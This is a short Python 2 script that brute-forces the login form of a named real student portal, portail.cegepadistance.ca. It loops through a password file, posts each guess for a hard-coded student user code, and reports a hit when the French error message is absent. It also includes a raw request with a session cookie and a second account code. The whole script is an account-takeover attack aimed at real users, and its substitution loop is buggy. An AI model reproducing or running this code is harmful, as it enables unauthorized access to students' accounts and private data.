import socket 
import httplib
import urllib
import sys
request = "https://portail.cegepadistance.ca:443/colnet/login.asp HTTP/1.1\nHost: portail.cegepadistance.ca\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br\nReferer: https://portail.cegepadistance.ca/colnet/login.asp\nCookie: ASPSESSIONIDSUDSAQCC=DNBCPNFAGKBNCGNAJGAKDHLE\nConnection: keep-alive\nContent-Type: application/x-www-form-urlencoded\nContent-length: 182\ntxtLibWebBidon=&txtCodeUsager=AGHA04099708&txtMotDePasse=test&btnConnecter.x=40&btnConnecter.y=11&_PostBackInfo=&_PostBackPar=&_Fields=DQ%2BL%2Bxuv22Yn3B49%2FD4&_NoSeqWeb=&_InfoSupp="

params = urllib.urlencode({'txtLibWebBidon': '','txtCodeUsager': 'ARSJ02527709','txtMotDePasse': 'T1T2T3$$p','btnConnecter.x': '40','btnConnecter.y': '11','_PostBackInfo': '','_PostBackPar': '','_Fields': 'DQ%2BL%2Bxuv22Yn3B49%2FD4','_NoSeqWeb': '','_InfoSupp': ''})

headers = {"Content-type": "application/x-www-form-urlencoded", "Accept": "text/plain"}


site='portail.cegepadistance.ca'
port=443
password = "pass"

conn = httplib.HTTPSConnection(site)
#conn.request("POST","/colnet/login.asp",params,headers)

with open ("passwords.txt",'r') as f:
	for line in f:
		password = line.strip() 

		params=params.replace('T1T2T3$$p',password)
		conn.request("POST","/colnet/login.asp",params,headers)
		r1 = conn.getresponse()
		resp = r1.read(15004)

		if "ou mot de passe invalide" not  in resp and "Mot de passe invalide" not in resp:
			print "[+] password found ! : " + str(password)
			sys.exit(1)
		else:
			print '[-] password tested : '+str(password)
			
	

 
